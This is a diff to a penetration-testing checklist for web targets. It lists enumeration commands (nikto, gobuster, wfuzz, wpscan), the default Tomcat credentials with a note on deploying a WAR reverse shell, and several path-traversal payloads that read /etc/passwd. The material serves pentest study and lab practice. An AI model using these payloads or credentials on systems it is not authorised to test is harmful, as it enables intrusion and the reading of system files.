@@ -13,7 +13,7 @@ HTTP and HTTPS Checklist
 
 Reference: [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)    
 [Wappanalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/), [Foxy Proxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and [user agent switcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) Firefox extensions  
-## Scan for sub directories and pages** 	
+## Scan for sub directories and pages	
 ### Wordlists 
 Common Wordlists to use for Web Directory Scanning: 
 
@@ -26,9 +26,9 @@ Common Wordlists to use for User Enumeration Scanning:
 
     /usr/share/seclists/Usernames
     /usr/share/wordlists/dirbuster/apache-user-enum-2.0
+    
 ### Scanning Tools
 
-    nmap http scripts     
     nikto -h http://127.0.0.1:80/     
     dirb http://127.0.0.1/   (default word list: common.txt)     
     gobuster dir -u http://127.0.0.1/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z     
@@ -37,19 +37,30 @@ Common Wordlists to use for User Enumeration Scanning:
 
     whatweb http://target  
     wfuzz -c --hc=404 -R 2 -w /usr/share/dirb/wordlists/common.txt http://target/fuzz   
-	
+    
+Other Tools: 
+    Burp Suite
+    OWASP Zap
+    Cadaver
+    SQLMap
+    Joomscan
+    Feroxbuster	
 	
 ## Web app specific  
-Wordpress: wpscan 
-
-
+    
 Jenkins: [pwn jenkins](https://github.com/Scr1ptK1ddie/pwn_jenkins)  
 
 Tomcat (usually port 8080, /manager) 
 
     default creds tomcat:s3cret
     generate war reverse shell, upload and deploy 
+    
+Wordpress: wpscan 
 
+    wpscan --url <domain>
+    wpscan --url <domain> --enumerate ap at (All Plugins, All Themes)
+    wpscan --url <domain> --enumerate u (Usernames)
+    wpscan --url <domain> --enumerate v 
 
 ## Login pages   
 	
@@ -69,11 +80,9 @@ Check for client side scripts
     http://example.com/index.php?page=../../../etc/passwd  
     http://example.com/index.php?page=../../../etc/passwd%00                  #PHP below v. 5.3.4 
     http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00        # double encoding    
-
-
-     http://example.com/index.php?page=....//....//etc/passwd
-     http://example.com/index.php?page=..///////..////..//////etc/passwd
-     http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+    http://example.com/index.php?page=....//....//etc/passwd
+    http://example.com/index.php?page=..///////..////..//////etc/passwd
+    http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 	
 	/etc/passwd, etc.
 	can you include a remote file?
